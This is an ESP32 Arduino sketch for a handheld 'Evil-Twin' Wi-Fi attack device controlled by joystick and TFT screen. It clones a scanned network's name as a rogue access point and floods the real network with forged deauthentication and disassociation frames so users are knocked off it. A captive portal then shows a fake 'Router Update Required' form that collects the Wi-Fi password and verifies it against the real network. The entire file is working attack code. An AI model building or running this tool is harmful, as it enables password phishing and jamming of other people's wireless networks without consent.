//JT ESP32 WIFI PASSWORD HASH FILE WITH IP 192:168:4:1
#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "esp_wifi.h"
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <SPI.h>

// --- TFT ST7735 Pin Definitions (Hardware HSPI) ---
#define TFT_SCK        17
#define TFT_MOSI        4
#define TFT_CS         25
#define TFT_DC         26
#define TFT_RST        27

// --- Joystick Pin Definitions ---
#define JOY_X          35
#define JOY_Y          34
#define JOY_SW         32

// --- Joystick Analog Thresholds (12-bit ADC) ---
#define ADC_LOW      1000
#define ADC_HIGH     3000

// Hardware SPI Display Object
SPIClass hSPI(HSPI);
Adafruit_ST7735 tft = Adafruit_ST7735(&hSPI, TFT_CS, TFT_DC, TFT_RST);

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

String _correct = "";
String _tryPassword = "";

// Master System Control Flags
bool isSystemRunning = false;
bool hotspot_active = false;
bool deauthing_active = false;

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;
unsigned long lastMoveTime = 0;
const unsigned long debounceDelay = 200;

// UI Selection Index (0 = Standalone AP, 1..N = Scanned Networks, 16 = START/STOP Button)
int selectedIndex = 0;

// Function Prototypes
String bytesToStr(const uint8_t* b, uint32_t size);
void handleIndex();
void handleResult();
void handleAdmin();
void performScan();
void clearArray();
void drawTFTUI();
void toggleStartStop();

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

void setup() {
  Serial.begin(115200);

  // Initialize Joystick Switch
  pinMode(JOY_SW, INPUT_PULLUP);

  // Initialize HSPI for TFT
  hSPI.begin(TFT_SCK, -1, TFT_MOSI, TFT_CS);
  tft.initR(INITR_BLACKTAB);
  tft.setRotation(1); // Landscape mode (160x128)
  tft.fillScreen(ST7735_BLACK);

  // Wi-Fi Setup
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_promiscuous(true);

  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Evil-Twin", "YellowPurple");

  dnsServer.start(DNS_PORT, "*", apIP);

  // Web Server Routes
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();

  // Set default fallback network
  _selectedNetwork.ssid = "Evil-Twin";
  _selectedNetwork.ch = 1;
  memset(_selectedNetwork.bssid, 0, 6);

  performScan();
  drawTFTUI();
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 15; ++i) { // Save slot 0 for Standalone option
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

void toggleStartStop() {
  // If no target network selected, fallback to Standalone "Evil-Twin"
  if (_selectedNetwork.ssid == "") {
    _selectedNetwork.ssid = "Evil-Twin";
    _selectedNetwork.ch = 1;
    memset(_selectedNetwork.bssid, 0, 6);
  }

  isSystemRunning = !isSystemRunning;

  if (isSystemRunning) {
    // Enable Hotspot & Deauth (if BSSID exists)
    hotspot_active = true;
    deauthing_active = (bytesToStr(_selectedNetwork.bssid, 6) != "00:00:00:00:00:00");

    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(_selectedNetwork.ssid.c_str());
    dnsServer.start(DNS_PORT, "*", apIP);
  } else {
    // STOP ATTACK: Return to default AP State
    deauthing_active = false;
    hotspot_active = false;

    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP("Evil-Twin", "YellowPurple");
    dnsServer.start(DNS_PORT, "*", apIP);
  }
  drawTFTUI();
}

void drawTFTUI() {
  tft.fillScreen(ST7735_BLACK);

  // Header Bar
  tft.setTextSize(1);
  tft.setTextColor(ST7735_CYAN);
  tft.setCursor(5, 2);
  tft.print("EVIL-TWIN CONTROLLER");
  tft.drawFastHLine(0, 12, tft.width(), ST7735_WHITE);

  // Render Selection Options (Index 0 = Standalone, Index 1..2 = Scanned Wi-Fi)
  int yOffset = 15;
  for (int i = 0; i < 3; i++) {
    String optionText = "";
    bool isSelectedTarget = false;

    if (i == 0) {
      optionText = "[ Standalone AP ]";
      isSelectedTarget = (_selectedNetwork.ssid == "Evil-Twin");
    } else {
      int netIdx = i - 1;
      if (_networks[netIdx].ssid != "") {
        optionText = _networks[netIdx].ssid;
        isSelectedTarget = (_networks[netIdx].ssid == _selectedNetwork.ssid);
      } else {
        optionText = "--- No Signal ---";
      }
    }

    if (i == selectedIndex) {
      tft.fillRect(2, yOffset - 1, tft.width() - 4, 11, ST7735_BLUE);
      tft.setTextColor(ST7735_WHITE);
    } else if (isSelectedTarget) {
      tft.setTextColor(ST7735_GREEN);
    } else {
      tft.setTextColor(ST7735_YELLOW);
    }

    tft.setCursor(5, yOffset);
    if (optionText.length() > 20) optionText = optionText.substring(0, 17) + "...";
    tft.print(optionText);
    yOffset += 12;
  }

  // Target Information Box (3 Lines: Name, Pass, ID)
  int boxX = 4;
  int boxY = 52;
  int boxWidth = tft.width() - 8;
  int boxHeight = 42;

  tft.drawRect(boxX, boxY, boxWidth, boxHeight, ST7735_CYAN);
  tft.setTextSize(1);

  // Line 1: Name
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(boxX + 4, boxY + 4);
  String targetName = (_selectedNetwork.ssid != "") ? _selectedNetwork.ssid : "Evil-Twin";
  if (targetName.length() > 14) targetName = targetName.substring(0, 11) + "...";
  tft.print("Name: " + targetName);

  // Line 2: Pass
  tft.setTextColor(ST7735_GREEN);
  tft.setCursor(boxX + 4, boxY + 16);
  String passDisplay = (_tryPassword != "") ? _tryPassword : "None";
  if (passDisplay.length() > 14) passDisplay = passDisplay.substring(0, 11) + "...";
  tft.print("Pass: " + passDisplay);

  // Line 3: ID
  tft.setTextColor(ST7735_MAGENTA);
  tft.setCursor(boxX + 4, boxY + 28);
  String idDisplay = bytesToStr(_selectedNetwork.bssid, 6);
  tft.print("ID: " + idDisplay);

  // START / STOP Button
  int btnX = 25;
  int btnY = 98;
  int btnW = 110;
  int btnH = 22;

  uint16_t btnBg = isSystemRunning ? ST7735_RED : ST7735_DARKGREEN;
  uint16_t btnTxt = ST7735_WHITE;

  if (selectedIndex == 16) { // Focused via Joystick
    btnBg = ST7735_WHITE;
    btnTxt = isSystemRunning ? ST7735_RED : ST7735_BLACK;
  }

  tft.fillRect(btnX, btnY, btnW, btnH, btnBg);
  tft.drawRect(btnX, btnY, btnW, btnH, ST7735_WHITE);

  tft.setTextSize(1);
  tft.setTextColor(btnTxt);

  if (isSystemRunning) {
    tft.setCursor(btnX + 40, btnY + 7);
    tft.print("STOP");
  } else {
    tft.setCursor(btnX + 37, btnY + 7);
    tft.print("START");
  }
}

void loop() {
  // Execute Web Server & Captive Portal when active
  if (isSystemRunning) {
    dnsServer.processNextRequest();
    webServer.handleClient();
  }

  // Analog Joystick Inputs
  int yVal = analogRead(JOY_Y);
  bool swPressed = (digitalRead(JOY_SW) == LOW);

  // Navigation Logic
  if (millis() - lastMoveTime > debounceDelay) {
    if (yVal < ADC_LOW) { // Joystick UP
      if (selectedIndex == 16) {
        selectedIndex = 2;
      } else if (selectedIndex > 0) {
        selectedIndex--;
      }
      drawTFTUI();
      lastMoveTime = millis();
    } 
    else if (yVal > ADC_HIGH) { // Joystick DOWN
      if (selectedIndex < 2) {
        selectedIndex++;
      } else {
        selectedIndex = 16; // Move focus to START/STOP button
      }
      drawTFTUI();
      lastMoveTime = millis();
    }
  }

  // Joystick Button Click Action
  if (swPressed) {
    if (selectedIndex == 16) {
      toggleStartStop();
    } else if (selectedIndex == 0) {
      // Standalone AP Mode
      _selectedNetwork.ssid = "Evil-Twin";
      _selectedNetwork.ch = 1;
      memset(_selectedNetwork.bssid, 0, 6);
      drawTFTUI();
    } else if (selectedIndex >= 1 && _networks[selectedIndex - 1].ssid != "") {
      // Select scanned network target
      _selectedNetwork = _networks[selectedIndex - 1];
      drawTFTUI();
    }
    delay(300); // Debounce
  }

  // Deauth Transmission Routine (ONLY runs when started AND target network is selected)
  if (isSystemRunning && deauthing_active && millis() - deauth_now >= 1000) {
    esp_wifi_set_channel(_selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);

    uint8_t deauthPacket[26] = {
      0xC0, 0x00, 0x00, 0x00, 
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 
      0x00, 0x01, 0x00
    };

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    // Send Deauth and Disassociation Packets
    deauthPacket[0] = 0xC0;
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);

    deauthPacket[0] = 0xA0;
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);

    deauth_now = millis();
  }

  // Background Wi-Fi Scan Refresh (Only when NOT running)
  if (!isSystemRunning && millis() - now >= 20000) {
    performScan();
    drawTFTUI();
    now = millis();
  }
}

// Web Server Request Handlers
void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 15; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    deauthing_active = (webServer.arg("deauth") == "start");
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", apIP);
    } else {
      hotspot_active = false;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP("Evil-Twin", "YellowPurple");
      dnsServer.start(DNS_PORT, "*", apIP);
    }
    return;
  }

  if (!hotspot_active) {
    String _html = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'></head><body><h2>ESP32 EvilTwin Running</h2></body></html>";
    webServer.send(200, "text/html", _html);
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      drawTFTUI(); // Update display with captured password immediately
      webServer.send(200, "text/html", "<!DOCTYPE html><html><body><h2>Updating...</h2></body></html>");
    } else {
      webServer.send(200, "text/html", "<!DOCTYPE html><html><body><h2>Router Update Required</h2><form action='/'><input type='text' name='password'><input type='submit'></form></body></html>");
    }
  }
}

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><body><h2>Wrong Password</h2></body></html>");
  } else {
    webServer.send(200, "text/html", "<html><body><h2>Good Password Captured!</h2></body></html>");
    isSystemRunning = false;
    hotspot_active = false;
    deauthing_active = false;
    _correct = "Password captured: " + _tryPassword;
    drawTFTUI();
  }
}

void handleAdmin() {
  webServer.send(200, "text/html", "<html><body><h2>Admin Page</h2></body></html>");
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  return str;
}
